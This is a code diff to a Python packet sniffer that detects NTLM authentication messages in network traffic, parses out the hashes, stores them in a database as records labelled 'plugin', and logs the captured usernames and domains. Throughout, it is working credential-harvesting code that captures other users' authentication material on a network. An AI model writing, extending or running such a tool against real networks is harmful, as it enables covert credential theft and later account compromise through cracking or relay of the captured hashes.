@@ -7,10 +7,12 @@ import re
 import platform
 import ctypes
 import os
+from src.modules.capture.parser import parse_hashes
+from src.utils.db_handler import DatabaseHandler
 
 class PacketSniffer:
     def __init__(self, interface: str = None):
-        self.logger = logging.getLogger(__name__) # Get logger instance
+        self.logger = logging.getLogger(__name__)
         
         # Check for admin privileges
         if not self._is_admin():
@@ -22,6 +24,8 @@ class PacketSniffer:
         self.interface = self._get_interface_name(interface)
         self.running = False
         self.capture_thread: Optional[threading.Thread] = None
+        self.db_handler = DatabaseHandler()
+        self.ntlm_sessions = {}  # Track NTLM sessions
 
     def _is_admin(self) -> bool:
         try:
@@ -107,26 +111,57 @@ class PacketSniffer:
                 if self._is_ntlm_auth(packet):
                     ntlm_data = self._extract_ntlm_data(packet)
                     if ntlm_data:
+                        # Parse the NTLM data
+                        parsed_hashes = parse_hashes(ntlm_data)
+                        for hash_info in parsed_hashes:
+                            if hash_info.get('complete_hash'):
+                                self._store_hash(hash_info)
+                            
                         self.logger.info(f"Captured NTLM hash from {packet[IP].src}")
                         return ntlm_data
             except Exception as e:
                 self.logger.error(f"Error processing packet: {e}")
         return None
 
+    def _store_hash(self, hash_info: Dict):
+        """Store captured hash information in database"""
+        try:
+            # Create plugin record for the capture
+            plugin_data = {
+                'nom_plugin': 'NTLM Capture',
+                'description': f'Captured from {hash_info["source"]}',
+                'version': '1.0',
+                'ntlm_key': hash_info['payload']
+            }
+            
+            # Store in database
+            self.db_handler.store_plugin(**plugin_data)
+            
+            # Log additional details if available
+            if hash_info.get('username'):
+                self.logger.info(f"Captured credentials for user: {hash_info['username']}")
+            if hash_info.get('domain'):
+                self.logger.info(f"Domain: {hash_info['domain']}")
+                
+        except Exception as e:
+            self.logger.error(f"Error storing hash: {e}")
+
     def _is_ntlm_auth(self, packet) -> bool:
         """Check if packet contains NTLM authentication"""
         try:
-            return b'NTLMSSP' in bytes(packet[TCP].payload)
+            payload = bytes(packet[TCP].payload)
+            return (b'NTLMSSP' in payload and 
+                   (b'NTLMSSP\x00\x01\x00\x00\x00' in payload or  # Type 1
+                    b'NTLMSSP\x00\x02\x00\x00\x00' in payload or  # Type 2
+                    b'NTLMSSP\x00\x03\x00\x00\x00' in payload))   # Type 3
         except:
             return False
 
     def _extract_ntlm_data(self, packet) -> Optional[Dict]:
         """Extract NTLM authentication data from packet"""
         try:
-            # Basic NTLM extraction - you might want to enhance this
             payload = bytes(packet[TCP].payload)
             if b'NTLMSSP' in payload:
-                # Implement proper NTLM parsing here
                 return {
                     'source': packet[IP].src,
                     'destination': packet[IP].dst,
